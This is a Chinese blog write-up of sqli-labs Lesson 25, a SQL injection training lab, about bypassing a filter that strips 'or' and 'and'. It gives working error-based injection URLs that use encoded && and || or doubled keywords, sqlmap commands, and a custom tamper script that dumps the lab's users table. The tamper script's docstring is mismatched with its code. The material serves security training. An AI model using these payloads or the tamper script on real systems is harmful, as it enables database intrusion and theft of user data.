---
title: sqli-labs lession 25 基于错误的GET单引号-你的OR及AND归我所有
date: 2018-10-03 23:09:30
tags: [sqli-labs]
categories: sql注入
---

# sqli-labs lession 25 基于错误的GET单引号-你的OR及AND归我所有

---

## 登录界面

![001](/img/sql/Lesson-25/001.png)

## 分析

从以下源码可以看出对or和and无论大小写都进行用空屁替代。

```
function blacklist($id)
{
	$id= preg_replace('/or/i',"", $id);			//strip out OR (non case sensitive)
	$id= preg_replace('/AND/i',"", $id);		//Strip out AND (non case sensitive)
	
	return $id;
}
```

这里就是考的就是绕过姿势了。

1.数学符号

and = && or = ||

`&`对应url编码`%26`,`|`对应url编码`%7c`。

`http://192.168.75.131/sql/Less-25/?id=1' %26%26 extractvalue(null,concat(0x7e,database(),0x7e))%23`

![002](/img/sql/Lesson-25/002.png)

`http://192.168.75.131/sql/Less-25/?id=1' %7c%7c extractvalue(null,concat(0x7e,database(),0x7e))%23`

![003](/img/sql/Lesson-25/003.png)

2.双写绕过

类似与`aandnd`和`oorr`

`http://192.168.75.131/sql/Less-25/?id=1' aandnd extractvalue(null,concat(0x7e,database(),0x7e))%23`

![004](/img/sql/Lesson-25/004.png)

`http://192.168.75.131/sql/Less-25/?id=1' oorr extractvalue(null,concat(0x7e,database(),0x7e))%23`

![005](/img/sql/Lesson-25/005.png)

## SQLMAP

最开始考虑使用的是symboliclogical.py脚本,这个脚本能用 && 替换 and ，用 || 替换 or，但是实际使用的时候遇到了麻烦,因为后续的Payload用到了information来设置payload,而information的会被过滤成infmation,这样SQLMAP就没法获得数据了。

`python sqlmap.py -u "http://192.168.75.131/sql/Less-25/?id=1" --tamper "symboliclogical.py" --technique E --dbms mysql --flush-session --fresh-queries --dbs -v 3`

![006](/img/sql/Lesson-25/006.png)

从上图的WARNING发现没有获取到数据,把payload复制下来跑下看看。

可以发现把information的or过滤了。

![007](/img/sql/Lesson-25/007.png)

修改脚本如下,另存一个脚本为`andor.py`

`retVal = re.sub(r"(?i)(and)", r"anandd", re.sub(r"(?i)(or)", "oorr", payload))`

这个用的是双写绕过and和or,而且information会被替换为infoormation

![008](/img/sql/Lesson-25/008.png)

```
#!/usr/bin/env python

"""
Copyright (c) 2006-2018 sqlmap developers (http://sqlmap.org/)
See the file 'LICENSE' for copying permission
"""

import re

from lib.core.enums import PRIORITY

__priority__ = PRIORITY.NORMAL

def tamper(payload, **kwargs):
    """
    Add an inline comment (/**/) to the end of all occurrences of (MySQL) "information_schema" identifier

    >>> tamper('and or')
    'anandd oorr'
    """

    retVal = payload

    if payload:
        retVal = re.sub(r"(?i)(and)", r"anandd", re.sub(r"(?i)(or)", "oorr", payload))

    return retVal
```

`python sqlmap.py -u "http://192.168.75.131/sql/Less-25/?id=1" --tamper "andor.py" --technique E --dbms mysql --flush-session --fresh-queries --threads 10 --dbs`

![009](/img/sql/Lesson-25/009.png)

接下来都一样了。

`python sqlmap.py -u "http://192.168.75.131/sql/Less-25/?id=1" --tamper "andor.py" --technique E --dbms mysql  --threads 10 -D security -T users --columns --dump`

![010](/img/sql/Lesson-25/010.png)


